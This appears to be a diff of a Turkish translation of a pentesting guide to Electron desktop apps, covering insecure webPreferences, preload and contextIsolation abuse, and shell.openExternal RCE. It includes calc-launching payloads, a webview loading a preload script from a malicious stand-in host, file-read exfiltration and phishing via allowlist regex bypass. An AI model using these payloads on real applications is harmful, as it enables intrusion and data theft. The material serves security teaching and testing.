@@ -4,7 +4,7 @@
 
 ## Giriş
 
-Electron, ayrıcalıklı bir **Node.js** ana sürecini **Chromium** renderer süreçleriyle birleştirir. Electron bir web tarayıcısı değildir: uygulama kodu, dosya sistemi ve shell erişimi gibi yetenekleri bilerek açığa çıkarabilir. Bu nedenle güvenilmeyen içerik yüklemek, sıradan bir web sitesine kıyasla daha sıkı sınır tasarımı gerektirir.<sup>[[21]](#references)</sup>
+Electron, ayrıcalıklı bir **Node.js** ana sürecini **Chromium** renderer süreçleriyle birleştirir. Electron bir web tarayıcısı değildir: uygulama kodu, dosya sistemi ve shell erişimi gibi yetenekleri kasıtlı olarak açığa çıkarabilir. Bu nedenle güvenilmeyen içerik yüklemek, sıradan bir web sitesindekinden daha sıkı bir sınır tasarımı gerektirir.<sup>[[21]](#references)</sup>
 
 Electron uygulama kodu genellikle bir `.asar` arşivinde paketlenir. Kaynak kodu incelemeden önce arşivi çıkarın:
 
@@ -13,7 +13,7 @@ npx asar extract app.asar destfolder #Extract everything
 npx asar extract-file app.asar main.js #Extract just a file
 ```
 
-Uygulamanın `package.json` dosyası ana giriş noktasını belirtir. Bu dosya genellikle renderer pencereleri oluşturur ve güvenlik açısından hassas `webPreferences` ayarlarını belirler.
+Uygulamanın `package.json` dosyası ana giriş noktasını belirtir. Bu dosya genellikle renderer pencereleri oluşturur ve güvenlikle ilgili `webPreferences` ayarlarını belirler.
 
 ```json
 {
@@ -21,14 +21,14 @@ Uygulamanın `package.json` dosyası ana giriş noktasını belirtir. Bu dosya g
   "main": "./app/index.js",
 ```
 
-Electron'ın iki temel process türü vardır:
+Electron'ın iki temel süreç türü vardır:
 
 - Main Process (NodeJS'e tam erişimi vardır)
-- Renderer Process (güvenlik nedeniyle NodeJS erişimi kısıtlı olmalıdır)
+- Renderer Process (güvenlik nedenleriyle NodeJS erişimi kısıtlanmalıdır)
 
-![Electron Masaüstü Uygulamaları - Giriş: Renderer Process (güvenlik nedeniyle NodeJS erişimi kısıtlı olmalıdır)](<../../images/image (182).png>)
+![Electron Desktop Apps - Introduction: Renderer Process (güvenlik nedenleriyle NodeJS erişimi kısıtlanmalıdır)](<../../images/image (182).png>)
 
-Bir **renderer process**, bir dosya yükleyen tarayıcı penceresi olacaktır:<sup>[[3]](#references)</sup>
+Bir **renderer process**, bir dosya yükleyen tarayıcı penceresidir:<sup>[[3]](#references)</sup>
 
 ```javascript
 const { BrowserWindow } = require("electron")
@@ -38,18 +38,18 @@ let win = new BrowserWindow()
 win.loadURL(`file://path/to/index.html`)
 ```
 
-**main process**, genellikle bir `BrowserWindow` oluşturulurken her renderer process'i yapılandırır. Güvenli ayarlar, renderer'ın ele geçirilmesinin native code execution'a dönüşme olasılığını azaltır; ancak güvenilmeyen içeriği doğası gereği güvenli hâle getirmez.<sup>[[21]](#references)[[22]](#references)</sup>
+**Ana süreç**, genellikle bir `BrowserWindow` oluştururken her renderer sürecini yapılandırır. Güvenli ayarlar, renderer'ın ele geçirilmesinin native code yürütmeye dönüşme olasılığını azaltır; ancak güvenilmeyen içeriği doğası gereği güvenli hâle getirmez.<sup>[[21]](#references)[[22]](#references)</sup>
 
-En azından şu renderer tercihlerini gözden geçirin:<sup>[[22]](#references)</sup>
+En azından şu renderer tercihlerini inceleyin:<sup>[[22]](#references)</sup>
 
 - **`nodeIntegration`** varsayılan olarak `false` değerindedir. Etkinleştirilmesi, renderer JavaScript'ine Node.js API'lerine erişim sağlar ve aynı zamanda o renderer'ın sandbox'ını devre dışı bırakır.
-- **`contextIsolation`** varsayılan olarak `true` değerindedir. Sayfanın JavaScript bağlamını, preload script'leri ve Electron dahili bileşenleri tarafından kullanılan bağlamdan ayırır.
-- **`preload`** için varsayılan bir yol yoktur. Yapılandırılmış bir preload script'i, sayfa script'lerinden önce çalışır ve `contextBridge` aracılığıyla kapsamı dar API'ler sunabilir.
-- **`sandbox`**, Electron 20'den beri varsayılan olarak `true` değerindedir. Renderer'ın işletim sistemi kaynaklarına erişimini kısıtlar; `nodeIntegration: true` ayarı bunu devre dışı bırakır.
-- **`nodeIntegrationInWorker`** varsayılan olarak `false` değerindedir ve Web Workers içindeki Node.js entegrasyonunu denetler.
+- **`contextIsolation`** varsayılan olarak `true` değerindedir. Sayfanın JavaScript bağlamını, preload betikleri ve Electron dahili bileşenleri tarafından kullanılan bağlamdan ayırır.
+- **`preload`** için varsayılan bir yol yoktur. Yapılandırılmış bir preload betiği, sayfa betiklerinden önce çalışır ve `contextBridge` üzerinden kapsamı daraltılmış API'ler sunabilir.
+- **`sandbox`**, Electron 20'den bu yana varsayılan olarak `true` değerindedir. Renderer'ın işletim sistemi kaynaklarına erişimini kısıtlar; `nodeIntegration: true` olarak ayarlanması sandbox'ı devre dışı bırakır.
+- **`nodeIntegrationInWorker`** varsayılan olarak `false` değerindedir ve Web Workers içindeki Node.js entegrasyonunu kontrol eder.
 - **`nodeIntegrationInSubFrames`** varsayılan olarak `false` değerindedir.
-  - **`nodeIntegration`** **etkinleştirilmişse**, Electron uygulamasındaki **iframe'lere yüklenen** web sayfalarında **Node.js API'lerinin** kullanılmasına izin verir.
-  - **`nodeIntegration`** **devre dışı bırakılmışsa**, preload'lar iframe içinde yüklenir.
+  - **`nodeIntegration`** **etkinleştirilirse**, Electron uygulamasında **iframe'lere yüklenen** web sayfalarında **Node.js API'lerinin** kullanılmasına izin verir.
+  - **`nodeIntegration`** **devre dışı bırakılırsa**, preload'lar iframe içinde yüklenir.
 
 Yapılandırma örneği:
 
@@ -79,7 +79,7 @@ const mainWindowOptions = {
 }
 ```
 
-Bazı **RCE payloads** [burada](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>
+[Buradaki bazı **RCE payloads**](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>
 
 ```html
 Example Payloads (Windows):
@@ -107,21 +107,21 @@ Example Payloads (Linux & MacOS):
 
 ### Trafiği yakalama
 
-start-main yapılandırmasını değiştirin ve aşağıdaki gibi bir proxy kullanın:
+start-main yapılandırmasını değiştirin ve aşağıdaki gibi bir proxy kullanımı ekleyin:
 
 ```javascript
 "start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
 ```
 
-## REA ile statik ASAR-native sınır izleme
+## REA ile statik ASAR'dan native sınıra iz sürme
 
-**REA**, JavaScript bootstrap kodunu çalıştırmadan bir ASAR'ı veya ayıklanmış uygulama dizinini okuyabilir. Uygulama grafiği; paket giriş noktalarını, paketlenmiş modülleri, `BrowserWindow` ve preload ayarlarını, `contextBridge` üyelerini, IPC kayıtlarını, native add-on isteklerini ve source map kimliklerini kaydeder. Bu, renderer'a açığa çıkarılan bir yeteneği ayrıcalıklı bir main-process handler'a kadar izlemek için başlangıç noktası sağlar.<sup>[[23]](#references)[[24]](#references)</sup>
+**REA**, JavaScript bootstrap'ını çalıştırmadan bir ASAR'ı veya çıkarılmış uygulama dizinini okuyabilir. Uygulama grafiği; paket giriş noktalarını, bundle edilmiş modülleri, `BrowserWindow` ve preload ayarlarını, `contextBridge` üyelerini, IPC kayıtlarını, native eklenti isteklerini ve source map kimliklerini kaydeder. Böylece renderer'a açığa çıkarılmış bir yeteneğin ayrıcalıklı bir main-process handler'ına izini sürmek için başlangıç noktası sağlar.<sup>[[23]](#references)[[24]](#references)</sup>
 
 ```bash
 rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
 ```
 
-Literal bir feature string için, Evidence kaydının tamamını `application` olarak aktarın ve seed'i hedefte gözlemlenen bir değerle değiştirin:<sup>[[25]](#references)</sup>
+Literal bir özellik dizgesi için, tam Evidence kaydını `application` olarak iletin ve seed değerini hedefte gözlemlenen bir değerle değiştirin:<sup>[[25]](#references)</sup>
 
 ```bash
 node --input-type=module -e '
@@ -133,23 +133,23 @@ writeFileSync("trace-input.json", JSON.stringify({
 rea trace-application-feature ./trace-input.json --json
 ```
 
-Aynı `trace_application_feature` iş akışı, gözlemlenen bir literal API üyesini, IPC kanalını veya modülü de başlangıç noktası olarak kabul eder. Elde edilen handler yolunu, doğrulama adaylarını ve native aktarımı, döndürülen kaynak konumlarına göre kontrol edin. Bir renderer `invoke` çağrısı yalnızca aynı tam literal kanaldaki benzersiz bir `ipcMain.handle`/`handleOnce` adayıyla eşleşir; `send` için de benzersiz bir `ipcMain.on`/`once`/`addListener` adayı gerekir. Dinamik veya yinelenen handler'lar çözümlenmemiş olarak kalır. İstenen bir `.node` üyesi, doğrulanmış bir native export değildir; bu sonuca varmadan önce eşleşen Hopper/Ghidra Evidence'ın aynı artifact digest'e sahip olması gerekir. Statik erişilebilirlik de yolun çalıştırıldığını kanıtlamaz.<sup>[[24]](#references)[[25]](#references)</sup>
+Aynı `trace_application_feature` workflow, gözlemlenen bir literal API member, IPC channel veya module'ü seed olarak da kabul eder. Döndürülen source location'lara göre elde edilen handler path'ini, validation adaylarını ve native handoff'u kontrol edin. Bir renderer `invoke`, yalnızca aynı exact literal channel üzerinde bulunan tekil bir `ipcMain.handle`/`handleOnce` adayıyla eşleşir; `send` için de tekil bir `ipcMain.on`/`once`/`addListener` adayı gerekir. Dinamik veya yinelenen handler'lar çözümlenmemiş olarak kalır. İstenen bir `.node` member, doğrulanmış bir native export değildir; bu sonuca varmak için eşleşen Hopper/Ghidra Evidence aynı artifact digest'e sahip olmalıdır. Statik reachability, path'in çalıştırıldığını da kanıtlamaz.<sup>[[24]](#references)[[25]](#references)</sup>
 
-Renderer-main güven sınırı ve handler doğrulaması için [Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md) sayfasına bakın.
+Renderer-to-main trust boundary ve handler validation hakkında bilgi için [Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md) sayfasına bakın.
 
-Provider kapsamındaki native takip incelemesi için [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea) sayfasına bakın.
+Provider-bound native follow-up için [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea) sayfasına bakın.
 
-## Electron auto-update attack surface
+## Electron auto-update saldırı yüzeyi
 
-Release-feed bütünlüğü, rollback, imzalı kanal karışıklığı ve staging-file TOCTOU için [Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md) sayfasına bakın.
+Release-feed integrity, rollback, signed-channel confusion ve staging-file TOCTOU hakkında bilgi için [Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md) sayfasına bakın.
 
 ## Electron Local Code Injection
 
-Yüklü bir uygulamaya yerel yazma veya instrumentation erişiminiz varsa, ASAR/main-process ve V8 snapshot yolları ile işletim sistemine özgü bağlantılar için [Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md) sayfasına bakın.
+Yüklü bir uygulamada local write veya instrumentation erişiminiz varsa ASAR/main-process ve V8 snapshot path'leri ile OS-specific bağlantılar için [Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md) sayfasına bakın.
 
 ## RCE: XSS + nodeIntegration
 
-**nodeIntegration** **on** olarak ayarlanmışsa, bir web sayfasının JavaScript'i yalnızca `require()` çağrısı yaparak Node.js özelliklerini kolayca kullanabilir. Örneğin, Windows'ta calc uygulamasını çalıştırma yöntemi şöyledir:
+**nodeIntegration** **on** olarak ayarlanırsa bir web sayfasının JavaScript'i, yalnızca `require()` çağrısı yaparak Node.js özelliklerini kolayca kullanabilir. Örneğin, Windows'ta calc uygulamasını çalıştırmanın yolu şöyledir:
 
 ```html
 <script>
@@ -163,7 +163,7 @@ Yüklü bir uygulamaya yerel yazma veya instrumentation erişiminiz varsa, ASAR/
 
 ## RCE: preload
 
-Bu ayarda belirtilen script, **renderer'daki diğer scriptlerden önce yüklenir**; bu nedenle **Node API'lerine sınırsız erişime** sahiptir:
+Bu ayarda belirtilen betik, **renderer'daki diğer betiklerden önce yüklenir**, bu nedenle **Node API'lerine sınırsız erişime sahiptir**:
 
 ```javascript
 new BrowserWindow{
@@ -174,7 +174,7 @@ new BrowserWindow{
 });
 ```
 
-Bu nedenle, script node-features'ı sayfalara dışa aktarabilir:
+Bu nedenle script, node-features'ı sayfalara aktarabilir:
 
 ```javascript:preload.js
 typeof require === "function"
@@ -196,17 +196,16 @@ window.runCalc = function () {
 
 ## RCE: XSS + contextIsolation
 
-_**contextIsolation**_, **web sayfası betikleri ile Electron'un dahili JavaScript kodu arasında ayrı bağlamlar** oluşturur; böylece her bir kodun JavaScript yürütmesi diğerini etkilemez. Bu, RCE olasılığını ortadan kaldırmak için gerekli bir özelliktir.
+_**contextIsolation**_, **web sayfası script'leri ile Electron'un dahili JavaScript kodu arasında ayrı bağlamlar** oluşturur; böylece her bir kodun JavaScript yürütmesi diğerini etkilemez. Bu, RCE olasılığını ortadan kaldırmak için gerekli bir özelliktir.
 
-Bağlamlar yalıtılmamışsa bir saldırgan şunları yapabilir:
+Bağlamlar yalıtılmamışsa saldırgan şunları yapabilir:
 
-1. **Renderer'da rastgele JavaScript çalıştırabilir** (XSS veya harici sitelere yönlendirme)
-2. Preload'da ya da Electron'un dahili kodunda kullanılan **yerleşik metodu kendi işleviyle değiştirebilir**
-3. **Değiştirilmiş işlevin kullanılmasını tetikleyebilir**
+1. **Renderer'da rastgele JavaScript yürütmek** (XSS veya harici sitelere yönlendirme)
+2. Preload veya Electron'un dahili kodunda kullanılan **yerleşik metodu kendi fonksiyonuyla değiştirmek**
+3. **Değiştirilmiş fonksiyonun kullanılmasını tetiklemek**
 4. RCE?
 
-Yerleşik metotların değiştirilebileceği iki yer vardır: Preload kodunda veya Electron'un dahili kodunda:
-
+Yerleşik metotların değiştirilebileceği 2 yer vardır: Preload kodunda veya Electron'un dahili kodunda:
 
 {{#ref}}
 electron-contextisolation-rce-via-preload-code.md
@@ -224,38 +223,38 @@ electron-contextisolation-rce-via-ipc.md
 
 ### Tıklama olayını atlatma
 
-Bir bağlantıya tıkladığınızda kısıtlamalar uygulanıyorsa, normal sol tıklama yerine **orta tıklama yaparak** bunları atlatabilirsiniz.
+Bir bağlantıya tıkladığınızda kısıtlamalar uygulanıyorsa normal sol tıklama yerine **orta tıklama yaparak** bunları atlatabilirsiniz
 
 ```javascript
 window.addEventListener('click', (e) => {
 ```
 
-## RCE via shell.openExternal
+## shell.openExternal üzerinden RCE
 
 Bu örnekler hakkında daha fazla bilgi için [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) ve [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>
 
-Bir Electron masaüstü uygulamasını dağıtırken `nodeIntegration` ve `contextIsolation` ayarlarının doğru olduğundan emin olmak çok önemlidir. Bu ayarlar etkin olduğunda, ana process'ten preload script'lerini veya Electron'ın yerel kodunu hedefleyen **client-side RCE**'nin etkili bir şekilde önlendiği bilinmektedir.
+Bir Electron masaüstü uygulaması dağıtırken, `nodeIntegration` ve `contextIsolation` için doğru ayarların yapılması çok önemlidir. Bu ayarlar etkinleştirildiğinde, ana süreçten preload script'lerini veya Electron'un yerel kodunu hedefleyen **istemci tarafı uzaktan kod yürütme (RCE)** saldırılarının etkili biçimde önlendiği bilinmektedir.
 
-Bir kullanıcı bağlantılarla etkileşime girdiğinde veya yeni pencereler açtığında, uygulamanın güvenliği ve işlevselliği açısından kritik olan belirli event listener'lar tetiklenir:
+Kullanıcı bağlantılarla etkileşime girdiğinde veya yeni pencereler açtığında, uygulamanın güvenliği ve işlevselliği açısından kritik olan belirli event listener'lar tetiklenir:
 
 ```javascript
 webContents.on("new-window", function (event, url, disposition, options) {}
 webContents.on("will-navigate", function (event, url) {}
 ```
 
-Bu listener'lar, kendi **iş mantığını** uygulamak için **desktop application** tarafından **override edilir**. Uygulama, gezinilen bir bağlantının dahili olarak mı yoksa harici bir web tarayıcısında mı açılması gerektiğini değerlendirir. Bu karar genellikle `openInternally` adlı bir fonksiyon aracılığıyla verilir. Bu fonksiyon `false` döndürürse bağlantının, `shell.openExternal` fonksiyonu kullanılarak harici olarak açılması gerektiği anlaşılır.
+Bu listener'lar, kendi **business logic**'ini uygulamak için **desktop application** tarafından override edilir. Uygulama, gezinilen bir linkin uygulama içinde mi yoksa harici bir web browser'da mı açılması gerektiğini değerlendirir. Bu karar genellikle `openInternally` adlı bir function aracılığıyla verilir. Bu function `false` döndürürse, linkin `shell.openExternal` function'ı kullanılarak harici olarak açılması gerektiği anlamına gelir.
 
-**Basitleştirilmiş bir pseudocode örneği:**
+**Basitleştirilmiş bir pseudocode:**
 
 ![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)
 
 ![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)
 
-Electron JS güvenlik en iyi uygulamaları, çeşitli protokoller üzerinden RCE'ye yol açabileceğinden, güvenilmeyen içeriğin `openExternal` fonksiyonuna verilmemesini önerir. İşletim sistemleri RCE'yi tetikleyebilecek farklı protokolleri destekler. Bu konuyla ilgili ayrıntılı örnekler ve açıklamalar için, bu güvenlik açığından yararlanabilen Windows protokol örneklerini de içeren [bu kaynağa](https://positive.security/blog/url-open-rce#windows-10-19042) başvurabilirsiniz.<sup>[[10]](#references)</sup>
+Electron JS security best practices, çeşitli protokoller üzerinden RCE'ye yol açabileceğinden, `openExternal` function'ına güvenilmeyen içerik verilmemesini önerir. İşletim sistemleri RCE'yi tetikleyebilecek farklı protokolleri destekler. Bu konuya ilişkin ayrıntılı örnekler ve açıklamalar için, bu güvenlik açığından yararlanabilen Windows protokolü örneklerini içeren [bu kaynağa](https://positive.security/blog/url-open-rce#windows-10-19042) başvurabilirsiniz.<sup>[[10]](#references)</sup>
 
-macOS'ta `openExternal` fonksiyonu, `shell.openExternal('file:///System/Applications/Calculator.app')` örneğindeki gibi rastgele komutları çalıştırmak için kullanılabilir.
+macOS'te `openExternal` function'ı, `shell.openExternal('file:///System/Applications/Calculator.app')` örneğindeki gibi, keyfi komutları çalıştırmak için istismar edilebilir.
 
-**Windows protokol exploit'lerine örnekler:**
+**Windows protokol exploit örnekleri:**
 
 ```html
 <script>
@@ -281,15 +280,15 @@ macOS'ta `openExternal` fonksiyonu, `shell.openExternal('file:///System/Applicat
 
 Bu zafiyet **[bu raporda](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)** bulunabilir.<sup>[[11]](#references)</sup>
 
-**webviewTag**, **renderer process** içinde **NodeJS** kullanımına izin veren **kullanımdan kaldırılmış bir özelliktir**. Preload context içinde aşağıdaki gibi bir script yüklenmesine izin verdiğinden devre dışı bırakılmalıdır:
+**webviewTag**, **renderer process** içinde **NodeJS** kullanımına izin veren **kullanımdan kaldırılmış bir özelliktir**. **preload context** içinde bir script yüklemeye izin verdiği için devre dışı bırakılmalıdır:
 
 ```xml
 <webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
 ```
 
-Dolayısıyla, rastgele bir sayfa yüklemeyi başaran bir saldırgan, bu etiketi **rastgele bir preload script yüklemek** için kullanabilirdi.
+Bu nedenle, rastgele bir sayfa yüklemeyi başaran bir saldırgan, bu tag'i **rastgele bir preload script yüklemek** için kullanabilirdi.
 
-Bu preload script daha sonra, **RCE elde etmek için `shell.openExternal` çağıran savunmasız bir IPC servisini (`skype-new-window`)** çağırmak üzere kötüye kullanıldı:
+Bu preload script daha sonra **RCE elde etmek için `shell.openExternal` çağıran savunmasız bir IPC servisini (`skype-new-window`)** çağırmak üzere kötüye kullanıldı.
 
 ```javascript
 (async() => {
@@ -304,11 +303,11 @@ Bu preload script daha sonra, **RCE elde etmek için `shell.openExternal` çağ�
 
 ## Dahili Dosyaları Okuma: XSS + contextIsolation
 
-**`contextIsolation`'ı devre dışı bırakmak,** yerel dosyaları okumak ve dışarı sızdırmak için `<iframe>` benzeri `<webview>` etiketlerinin kullanılmasını sağlar. Verilen bir örnek, dahili dosyaların içeriğini okumak için bu güvenlik açığından nasıl yararlanılabileceğini gösterir:<sup>[[2]](#references)</sup>
+**`contextIsolation` özelliğini devre dışı bırakmak, `<iframe>` benzeri `<webview>` etiketlerinin kullanılmasını sağlar**; böylece yerel dosyalar okunup exfiltrate edilebilir. Verilen bir örnek, dahili dosyaların içeriğini okumak için bu güvenlik açığından nasıl yararlanılabileceğini gösterir:<sup>[[2]](#references)</sup>
 
-![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Dahili Dosyaları Okuma: XSS + contextIsolation: contextIsolation'ı devre dışı bırakmak, ... için etiketlerin kullanılmasını sağlar; bu etiketler ... benzeridir...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)
+![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Dahili Dosyaları Okuma: XSS + contextIsolation: contextIsolation özelliğini devre dışı bırakmak, ... benzeri ... etiketlerinin kullanılmasını sağlar...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)
 
-Ayrıca, bir Electron masaüstü uygulamasındaki kritik bir yerel dosya okuma güvenlik açığını vurgulayan **dahili bir dosyayı okuma** yöntemi daha paylaşılıyor. Bu yöntem, uygulamadan yararlanmak ve verileri dışarı sızdırmak için bir script enjekte etmeyi içerir:
+Ayrıca, bir Electron masaüstü uygulamasındaki kritik bir yerel dosya okuma güvenlik açığını vurgulayan **dahili bir dosyayı okumanın** başka bir yöntemi de paylaşılır. Bu yöntemde, uygulamadan yararlanmak ve verileri exfiltrate etmek için bir script enjekte edilir:
 
 ```html
 <br /><br /><br /><br />
@@ -328,10 +327,10 @@ Ayrıca, bir Electron masaüstü uygulamasındaki kritik bir yerel dosya okuma g
 
 ## **RCE: XSS + Eski Chromium**
 
-Uygulamayla birlikte gelen **Chromium** sürümü eskiyse ve bilinen güvenlik açıkları varsa, bu açıklardan yararlanarak XSS'i RCE'ye dönüştürmek mümkün olabilir.<sup>[[20]](#references)</sup>\
-Bir örneği bu **writeup**'ta görebilirsiniz: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>
+Uygulamayla birlikte gelen **Chromium** sürümü eskiyse ve bilinen güvenlik açıklarına sahipse, bu açıklardan yararlanıp XSS'i RCE'ye dönüştürmek mümkün olabilir.<sup>[[20]](#references)</sup>\
+Bu **writeup**'ta bir örnek görebilirsiniz: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>
 
-## **Dahili URL regex bypass üzerinden XSS phishing**
+## **Dahili URL regex atlatması üzerinden XSS phishing**
 
 XSS bulduysanız ancak **RCE tetikleyemiyor veya dahili dosyaları çalamıyorsanız**, yine de **phishing yoluyla kimlik bilgilerini çalmayı** deneyebilirsiniz.<sup>[[1]](#references)</sup>
 
@@ -344,7 +343,7 @@ webContents.on("will-navigate", function (event, url) {}                    // o
 
 **`openInternally`** çağrısı, bir platform bağlantısının **masaüstü penceresinde** mi yoksa üçüncü taraf bir kaynağın sistem tarayıcısında mı açılacağını belirler.
 
-Fonksiyonun URL allowlist regex'i atlatılabiliyorsa (örneğin, hostname içindeki noktalar escape edilmediği için), bir saldırgan XSS'i kötüye kullanarak saldırganın kontrolündeki altyapıda inandırıcı bir kimlik bilgisi istemi açabilir:
+Fonksiyonun URL allowlist regex'i atlatılabilirse (örneğin, hostname'deki noktalar escape edilmediği için), bir saldırgan XSS'i kötüye kullanarak saldırganın kontrolündeki bir altyapıda inandırıcı bir kimlik bilgisi istemi açabilir:
 
 ```html
 <script>
@@ -352,23 +351,25 @@ Fonksiyonun URL allowlist regex'i atlatılabiliyorsa (örneğin, hostname içind
 </script>
 ```
 
-## `file://` Protocol
+## `file://` Protokolü
 
-[Electron güvenlik kılavuzunda](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) belirtildiği gibi, **`file://`** üzerinde çalışan sayfalar geniş dosya erişimine sahiptir. Bu nedenle **XSS, kullanıcının makinesindeki rastgele dosyaları yüklemek için kullanılabilir**. Doğru tasarlanmış bir **custom protocol**, erişimi belirli bir dosya kümesiyle kısıtlayabilir.<sup>[[21]](#references)</sup>
+[Electron güvenlik kılavuzunda](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) belirtildiği gibi, **`file://`** üzerinde çalışan sayfalar geniş dosya erişimine sahiptir. Bu nedenle **XSS, kullanıcının makinesindeki rastgele dosyaları yüklemek için kullanılabilir**. Doğru tasarlanmış bir **özel protokol**, erişimi belirli bir dosya kümesiyle kısıtlayabilir.<sup>[[21]](#references)</sup>
 
-## Remote module
+Masaüstü asistanı önizlemelerinde farklı bir worker-context dosya kapsamı bypass'ı için bkz. [AI assistant embedded browser trust boundaries](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope).
 
-Electron Remote module, **renderer process'lerin main process API'lerine erişmesini** sağlayarak bir Electron uygulamasındaki iletişimi kolaylaştırır. Ancak bu module'ü etkinleştirmek önemli güvenlik riskleri doğurur. Uygulamanın saldırı yüzeyini genişleterek onu cross-site scripting (XSS) saldırıları gibi güvenlik açıklarına karşı daha savunmasız hâle getirir.
+## Remote modülü
+
+Electron Remote modülü, **renderer süreçlerinin main process API'lerine erişmesini** sağlayarak bir Electron uygulaması içindeki iletişimi kolaylaştırır. Ancak bu modülün etkinleştirilmesi önemli güvenlik riskleri doğurur. Uygulamanın saldırı yüzeyini genişleterek, onu siteler arası betik (XSS) saldırıları gibi güvenlik açıklarına karşı daha savunmasız hâle getirir.
 
 > [!TIP]
-> **remote** module, main process'teki bazı API'leri renderer process'lere sunsa da yalnızca bileşenleri kötüye kullanarak RCE elde etmek pek kolay değildir. Ancak bileşenler hassas bilgileri açığa çıkarabilir.
+> **remote** modülü main process'teki bazı API'leri renderer süreçlerine sunsa da, yalnızca bu bileşenleri kötüye kullanarak RCE elde etmek kolay değildir. Ancak bileşenler hassas bilgileri açığa çıkarabilir.
 
 > [!WARNING]
-> Hâlâ remote module'ü kullanan birçok uygulama bunu renderer process'te **NodeIntegration'ın etkin olmasını gerektirecek** şekilde yapar; bu **büyük bir güvenlik riskidir**.
+> Hâlâ remote modülünü kullanan birçok uygulama, bunu renderer sürecinde **NodeIntegration'ın etkin olmasını gerektirecek şekilde** kullanır. Bu, **çok büyük bir güvenlik riskidir**.
 
-Electron'ın yerleşik `remote` module'ü kullanım dışı bırakıldı ve ardından kaldırıldı; bu modeli hâlâ gerektiren uygulamalar ayrı `@electron/remote` paketini kullanabilir. Güvenlik ve performans üzerindeki etkileri nedeniyle, güvenilmeyen renderer process'lere remote tarzı yetenekler sunmaktan kaçının.
+Electron'ın yerleşik `remote` modülü kullanımdan kaldırıldı ve ardından kaldırıldı; bu modeli kullanmaya devam etmesi gereken uygulamalar ayrı `@electron/remote` paketini kullanabilir. Güvenlik ve performans etkileri nedeniyle, remote benzeri yetenekleri güvenilmeyen renderer'lara açmaktan kaçının.
 
-`@electron/remote` kullanılırken, önce **main process'te başlatılmalıdır**:
+`@electron/remote` kullanırken, önce **main process'te başlatılması** gerekir:
 
 ```javascript
 const remoteMain = require('@electron/remote/main')
@@ -381,30 +382,30 @@ function createMainWindow() {
   remoteMain.enable(mainWindow.webContents)
 ```
 
-Renderer process daha sonra modülden nesneleri içe aktarabilir:
+Renderer süreci daha sonra modülden nesneleri içe aktarabilir:
 
 ```javascript
 import { dialog, getCurrentWindow } from '@electron/remote'
 ```
 
-**[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)**, remote modülündeki **`app`** nesnesi tarafından sunulan bazı ilginç **işlevlere** işaret ediyor:<sup>[[6]](#references)</sup>
+The **[blog yazısı](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)**, remote module'deki **`app`** nesnesi tarafından sunulan bazı ilginç **fonksiyonları** gösteriyor:<sup>[[6]](#references)</sup>
 
 - **`app.relaunch([options])`**  
-   - Mevcut örneği **kapatıp** yenisini **başlatarak** uygulamayı **yeniden başlatır**. **Uygulama güncellemeleri** veya önemli **durum değişiklikleri** için kullanışlıdır.
+   - Mevcut örneği **sonlandırıp** yeni bir örnek **başlatarak** uygulamayı **yeniden başlatır**. **Uygulama güncellemeleri** veya önemli **durum değişiklikleri** için kullanışlıdır.
 - **`app.setAppLogsPath([path])`**  
-   - **App logs** depolamak için bir dizin **tanımlar** veya **oluşturur**. Loglar, **`app.getPath()`** veya **`app.setPath(pathName, newPath)`** kullanılarak **alınabilir** veya **değiştirilebilir**.
+   - **Uygulama günlüklerini** depolamak için bir dizin **tanımlar** veya **oluşturur**. Günlükler, **`app.getPath()`** veya **`app.setPath(pathName, newPath)`** kullanılarak **alınabilir** ya da **değiştirilebilir**.
 - **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
-   - Geçerli executable'ı belirtilen **protocol** için **varsayılan handler** olarak **kaydeder**. Gerekirse **özel bir path** ve **argümanlar** sağlayabilirsiniz.
+   - Geçerli çalıştırılabilir dosyayı, belirtilen bir **protokol** için **varsayılan işleyici** olarak **kaydeder**. Gerekirse **özel bir yol** ve **argümanlar** sağlayabilirsiniz.
 - **`app.setUserTasks(tasks)`**  
-   - (Windows'ta) **Jump List** içindeki **Tasks kategorisine** görevler **ekler**. Her görev, uygulamanın nasıl **başlatılacağını** veya hangi **argümanların** iletileceğini belirleyebilir.
